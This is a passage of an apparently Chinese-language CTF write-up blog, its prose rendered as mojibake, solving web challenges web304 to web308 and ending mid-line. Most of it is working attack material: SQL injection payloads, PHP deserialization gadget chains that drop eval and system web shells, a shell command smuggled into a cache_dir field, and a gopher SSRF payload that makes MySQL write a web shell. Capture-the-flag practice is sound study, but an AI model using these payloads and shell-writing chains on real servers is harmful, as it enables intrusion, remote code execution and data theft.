class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¼¼ä¹ä¸Šé¢çš„payloadä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;, sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;, sds_address=(select group_concat(column_name) from information_schema.columns where table_name=&quot;sds_flaag&quot;)--+</span><br></pre></td></tr></table></figure><h1 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h1><p>å¯†ç è¿˜æ˜¯ç›¸åŒçš„ï¼Œå…ˆçœ‹ä¸€çœ¼wafï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\&#x27;|\&quot;|\,|\.|\?|\/|\\\|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨å…¥æ„Ÿè§‰ä¸å¤ªè¡Œï¼Œæ¢ä¸ªæ€è·¯ã€‚<br>class.phpé‡Œé¢ä¼¼ä¹æœ‰ååºåˆ—åŒ–æ¼æ´ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å†æ‰¾ä»–çš„æ³¨å…¥ç‚¹ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692776440370-d18b7389-60e4-4c78-a4c1-c9fdbfc084a3.png" alt="image.png"><br>åœ¨checklogin.phpé‡Œé¢ï¼Œé‚£æˆ‘ä»¬ç›´æ¥å†™ä¸€ä¸ªshellè¿›å»ã€‚è¿™é‡Œéœ€è¦urlç¼–ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>åŠ å…¥åˆ°cookieé‡Œé¢ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>user%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">221</span>.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+<span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">24</span>_GET%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>å†™äº†shellä¹‹åå‘ç°é‡Œé¢æ²¡æœ‰flagæ–‡ä»¶ï¼Œé‚£ä¼°è®¡å°±æ˜¯åœ¨æ•°æ®åº“ä¸­ã€‚<br>ç”¨èšå‰‘è¿æ¥æ•°æ®åº“ï¼Œå¯†ç æ˜¯rootï¼Œå¼±å£ä»¤ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692780896651-ce25991e-b502-4cb3-bb5b-ca641e6b0557.png" alt="image.png"></p><h1 id="web306"><a href="#web306" class="headerlink" title="web306"></a>web306</h1><h2 id="phpååºåˆ—åŒ–"><a href="#phpååºåˆ—åŒ–" class="headerlink" title="phpååºåˆ—åŒ–"></a>phpååºåˆ—åŒ–</h2><p>è¿˜æ˜¯ååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;log.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$info</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginfo</span>(<span class="params"><span class="variable">$info</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;info=<span class="variable language_">$this</span>-&gt;info.<span class="variable">$info</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;title, <span class="variable">$this</span>-&gt;info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692783099271-9c0ed153-1fea-4ee8-995b-57a3c3dc502e.png" alt="image.png"><br>æŸ¥è¯¢ä¹‹åå‘ç°æœ‰ä¸€ä¸ªè°ƒç”¨closeæ–¹æ³•çš„ä½ç½®ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>indexé‡Œé¢åŒ…å«äº†éœ€è¦çš„æ–‡ä»¶ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692783481714-0b44c2cf-10f0-4c57-af3b-0e0e162e724d.png" alt="image.png"><br>å†™ä¸€ä¸‹expï¼š<br>æ³¨æ„è¿™ä»¥ä¸‹éƒ½æ˜¯é”™çš„ï¼ï¼ï¼ï¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="comment">// æ³¨æ„private å…ˆæ”¹åä¿®å§</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;log.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$info</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginfo</span>(<span class="params"><span class="variable">$info</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;info=<span class="variable language_">$this</span>-&gt;info.<span class="variable">$info</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;title, <span class="variable">$this</span>-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">log</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;title = <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;info = <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;conn = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>dao%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>dao%<span class="number">00</span>config%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>conn%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>log%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>title%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">221</span>.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>info%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+<span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br><span class="line">ä¿®æ”¹<span class="keyword">public</span>ä¸º<span class="keyword">private</span>ï¼Œå¹¶ä¸”ä¿®æ”¹å­—ç¬¦ä¸ªæ•°</span><br><span class="line">O%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>dao%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>dao%<span class="number">00</span>config%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>dao%<span class="number">00</span>conn%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>log%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>title%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">221</span>.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>info%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+<span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br><span class="line">å†å¥—ä¸€å±‚base64</span><br></pre></td></tr></table></figure><p>è¿™ä»¥ä¸Šéƒ½æ˜¯é”™çš„<br>å¦ˆçš„ é‚£ä¸ªbase64ä¹‹å‰ä¸éœ€è¦urlè½¬ä¹‰ï¼Œè€Œä¸”æœ‰æ›´å¥½çš„å†™æ³•ï¼Œåˆ©ç”¨constructæ„é€ æ–¹æ³•è§£å†³ï¼š<br>æ–°çš„expï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;conn=<span class="keyword">new</span> <span class="title function_ invoke__">log</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;a.php&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$info</span>=<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ“¦ï¼Œå¡åœ¨äº†å¯†ç è¿™åŠå°æ—¶ï¼Œå¯†ç æ˜¯<code>admin1</code>ï¼Œä»”ç»†è¯»äº†ä¸€ä¸‹ä»£ç ï¼Œå‘ç°å¤šå±‚md5åŠ å¯†ï¼Œè€Œä¸”æœ‰saltï¼Œå› æ­¤åº”è¯¥æ˜¯å¼±å£ä»¤çˆ†ç ´å‡ºæ¥ã€‚ç ”ç©¶äº†åŠå¤©hashcatã€‚</p><h1 id="web307"><a href="#web307" class="headerlink" title="web307"></a>web307</h1><p>ç›´æ¥ä¸Šcnseayï¼Œä¸€é”®å®¡è®¡ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694926443971-a06d0593-19be-4cb4-bf93-27dc36a331f5.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694926518010-4273905e-a413-4f6e-9968-494658b6560c.png" alt="image.png"><br>ç¬¬äºŒä¸ªç›´æ¥ç”¨åˆ†å·éš”æ–­è¿›è¡Œå‘½ä»¤æ‰§è¡Œå³å¯ã€‚<br>æ„é€ ä¸€ä¸‹å†…å®¹ï¼Œå†™ä¸ªé©¬ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_dir</span> = <span class="string">&#x27;;echo &quot;&lt;?php system($_POST[1]); ?&gt;&quot; &gt; 1.php;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = <span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>()));</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czo5OiJjYWNoZV9kaXIiO3M6NDQ6IjtlY2hvICI8P3BocCBzeXN0ZW0oJF9QT1NUWzFdKTsgPz4iID4gMS5waHA7Ijt9fQ</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿™é‡Œæ¿€æ´»ç‚¹ç”¨çš„æ˜¯ï¼šlogoutä¸‹çš„ï¼Œå› æ­¤æ³¨æ„ç”Ÿæˆé©¬çš„ç›¸å¯¹è·¯å¾„å‰ä¹Ÿæœ‰ä¸ªcontroller<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694927480974-575e9f4d-bcdc-4475-9bcb-da89a43c285a.png" alt="image.png"><br>æµ‹äº†ï¼Œæ ¡å›­ç½‘ä¼ ä¸ä¸Šå»payloadã€‚ç›´æ¥å†™å…¥è¯»ä¸€ä¸‹å§ã€‚</p><h1 id="web308"><a href="#web308" class="headerlink" title="web308"></a>web308</h1><h3 id="SSRFæ‰“mysql"><a href="#SSRFæ‰“mysql" class="headerlink" title="SSRFæ‰“mysql"></a>SSRFæ‰“mysql</h3><blockquote><p><a href="https://blog.csdn.net/qq_42880719/article/details/122510390">https://blog.csdn.net/qq_42880719/article/details/122510390</a></p></blockquote><p>æˆ‘åˆè®¡è¿˜ç”¨åŸæ¥çš„å†™æ³•ï¼Œå‰åæ‹¼æ¥ä¸€ä¸‹ï¼Œåº”è¯¥è¿˜èƒ½ç”¨ï¼Œä½†æ˜¯wpç”¨äº†ssrfã€‚æ­£å¥½æ²¡æ¥è§¦è¿‡ï¼Œå­¦ä¸€ä¸‹ã€‚</p><blockquote><p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰</p></blockquote><p>é€šè¿‡gopherusç”Ÿæˆpayloadæ¥æ‰“mysql<br>åˆ©ç”¨ç‚¹åœ¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkUpdate</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">false</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Give MySQL username: root</span><br><span class="line">Give query to execute: select <span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span> into outfile <span class="string">&quot;/var/www/html/1.php&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694929570468-2704a7e4-7a92-4c63-bbb9-e5f479587b22.png" alt="image.png"><br>pocï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = <span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>()));</span><br><span class="line"><span 